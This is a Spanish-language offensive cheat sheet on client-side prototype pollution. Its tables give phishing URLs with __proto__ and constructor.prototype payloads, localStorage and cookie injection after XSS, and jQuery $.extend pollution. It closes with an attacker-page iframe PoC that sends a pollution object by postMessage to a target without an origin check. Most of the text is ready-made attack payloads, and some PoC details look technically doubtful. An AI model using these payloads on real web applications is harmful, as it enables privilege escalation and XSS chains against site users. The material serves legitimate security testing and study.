---
aliases:
  - Client-Side PP
  - DOM Prototype Pollution
  - DOM PP
tags:
  - type/cheatsheet
  - vuln/prototype-pollution
  - technique/initial-access
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Prototype Pollution]]'
  - '[[Cross-Site Scripting (XSS)]]'
---
# Prototype Pollution - Vectores Client-Side

***

## URL Hash / Search Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Phishing URL: `https://target/?__proto__[polluted]=yes` | qs-style parser del cliente pollute via search | Client lib usa qs/similar. |
| `https://target/#__proto__[polluted]=yes` | Hash-based pollution | SPA con hash routing. |
| `https://target/?obj[__proto__][polluted]=yes` | Nested bracket pollution | Custom DIY parser. |
| `https://target/?constructor[prototype][polluted]=yes` | constructor.prototype bypass | Filter __proto__ only. |
| `https://target/#!/path?__proto__[isAdmin]=true` | Hash-bang routing PP | SPA routers viejos. |
| `https://target/?__proto__.polluted=yes` (dot notation) | Custom parser con dot syntax | DIY parsers. |
| Browser console post-visit: `({}).polluted` o `Object.prototype.polluted` | Confirma pollution global | Validation. |
| Inspect frontend code: `curl -s https://target/main.js \| grep -E 'location\\.search\|location\\.hash\|URLSearchParams'` | Identificar parser usado | Source review. |
| Browser console: `new URLSearchParams(location.search).get('__proto__')` | Test si URLSearchParams expone | Pre-attack JS test. |
^pp-client-url

### PoC URL hash pollution

```javascript
// Vulnerable SPA parser
function parseHash() {
  const hash = location.hash.slice(1);
  return hash.split('&').reduce((acc, pair) => {
    const [k, v] = pair.split('=');
    deepSet(acc, k.split('.'), v);  // VULN si k='__proto__.x'
    return acc;
  }, {});
}

// Visit: https://target/#__proto__.polluted=yes
// All objects ahora tienen .polluted = "yes"
```

___

## JSON.parse + Merge

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| XSS injection: `<script>localStorage.setItem('config','{"__proto__":{"isAdmin":true}}')</script>` | LocalStorage pollution post-XSS | App carga config con merge. |
| Phishing URL con encoded JSON: `https://target/?config=%7B%22__proto__%22%3A%7B%22isAdmin%22%3Atrue%7D%7D` | Frontend JSON.parse + merge | Custom serialization. |
| `https://target/#__proto__=%7B%22isAdmin%22%3Atrue%7D` (URL fragment JSON) | Hash JSON pollution | SPA fragment-based state. |
| `document.cookie = "config=" + encodeURIComponent('{"__proto__":{"isAdmin":true}}')` (XSS combo) | Cookie JSON pollution | Cookie parsed + merged. |
| Browser console post-XSS: `({}).isAdmin` | Confirma pollution | Validation. |
| Inspect JS: `grep -E 'JSON\\.parse.*merge\|fetch.*merge' main.js` | Identify JSON merge sinks | Source review. |
^pp-client-json

___

## DOM-based Pollution

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Phishing URL con `$.extend(true,...)` sink: `https://target/?config={"__proto__":{"polluted":"yes"}}` | jQuery 3.x pre-3.4 `$.extend(true)` pollution | CVE-2019-11358. |
| Inspect frontend: `grep -E '\\$\\.extend.*true' main.js` | Find vulnerable extend calls | Source review. |
| Browser console: `$.extend(true, {}, JSON.parse('{"__proto__":{"polluted":"yes"}}')); console.log({}.polluted)` | Test pollution local | Local PoC. |
| Phishing con `data-*` attribute: HTML injection con `<div data-config='{"__proto__":{"x":"y"}}'>` | DOM scraper que mergea data-* atributos | Custom DOM scraping. |
| Combine con XSS: `<script>$.extend(true, app.config, {"__proto__":{"isAdmin":true}})</script>` | XSS + jQuery extend chain | XSS combo. |
| Browser console: `Object.prototype.hasOwnProperty=...` (test if Object.prototype mutable) | Confirm Object.prototype writable | Pre-attack. |
^pp-client-dom

___

## postMessage Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Hostear iframe: `<iframe src="https://target.com/" id="t"></iframe>` + script que `postMessage({"__proto__":{"isAdmin":true}}, '*')` | Cross-origin pollution via postMessage | Target listener sin origin check. |
| Browser console (en target): `window.addEventListener('message', e => console.log(e.origin, e.data))` | Identify listeners + sources | Pre-attack debug. |
| `window.opener.postMessage({"__proto__":{"polluted":"yes"}}, '*')` desde popup atacante | Reverse tabnabbing pollution | Popup-based. |
| `new BroadcastChannel('x').postMessage({"__proto__":{"polluted":"yes"}})` (mismo origin) | BroadcastChannel pollution | XSS combo (mismo origin only). |
| Inspect frontend: `grep -E 'addEventListener\\(.message' main.js` | Find postMessage handlers | Source review. |
| Browser console post-attack en target: `({}).isAdmin` | Validation | Confirm. |
^pp-client-postmessage

### postMessage pollution PoC

```html
<!-- attacker.com -->
<iframe src="https://target.com/" id="t"></iframe>
<script>
  document.getElementById('t').onload = () => {
    document.getElementById('t').contentWindow.postMessage(
      {"__proto__":{"isAdmin":true}},
      '*'  // any origin
    );
  };
</script>
```

Target.com vulnerable code:
```javascript
window.addEventListener('message', e => {
  // No origin check!
  Object.assign(config, e.data);  // o _.merge, o custom merge
});
```

→ Pollution global en window target.

***
